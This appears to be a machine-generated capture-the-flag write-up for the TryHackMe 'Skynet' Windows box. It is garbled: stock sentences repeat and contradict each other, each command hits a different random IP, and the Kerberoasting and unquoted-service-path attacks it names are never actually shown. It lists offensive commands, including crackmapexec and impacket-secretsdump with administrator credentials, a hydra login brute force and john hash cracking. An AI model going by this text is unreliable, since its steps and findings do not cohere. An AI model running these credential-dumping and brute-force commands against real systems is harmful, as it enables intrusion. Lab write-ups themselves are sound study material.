---
TitleSEO: "TryHackMe — Skynet (Easy Windows) | ZureFX"
TitlePost: "TryHackMe — Skynet (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Skynet. Kerberoasting and Unquoted Service Path to achieve easy compromise on Windows."
Keywords: "easy, medium, active directory, web, pwntilldawn, hard, reversing"
URL: "https://zurefx.github.io/writeups/htb-skynet-564.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-skynet-564/"
Date: "2024-03-24"
Tags: "Easy, Medium, Active Directory, Web, PwnTillDawn, Hard, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-skynet-564"
Permalink: "/writeups/htb-skynet-564.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Skynet** is rated **Easy** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.87.102.186`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p25,8888,5986 10.34.86.12 -oN scan.txt
nmap -sCV -p5985,3389,8443 10.79.179.207 -oN scan.txt
crackmapexec smb 10.71.94.14 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
gobuster dir -u http://10.52.94.244/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.44.64.24/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.43.198.73 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.33.123.78 -u administrator -p 'P@ssw0rd!' --shares
```

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

### Web Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

```bash
nmap -sCV -p143,636,993 10.37.6.52 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.95.16.166/FUZZ
```

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Unquoted Service Path**.

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.97.149.74 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.194.174
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.73.31.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.120.78 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
gobuster dir -u http://10.24.177.14/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.72.212/FUZZ
gobuster dir -u http://10.16.227.32/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `john`
- `kerbrute`
- `wmiexec`
- `GetUserSPNs`
- `impacket`
- `enum4linux`

### Key Takeaways

- Kerberoasting
- Unquoted Service Path
- DLL Hijacking
- Remote File Inclusion
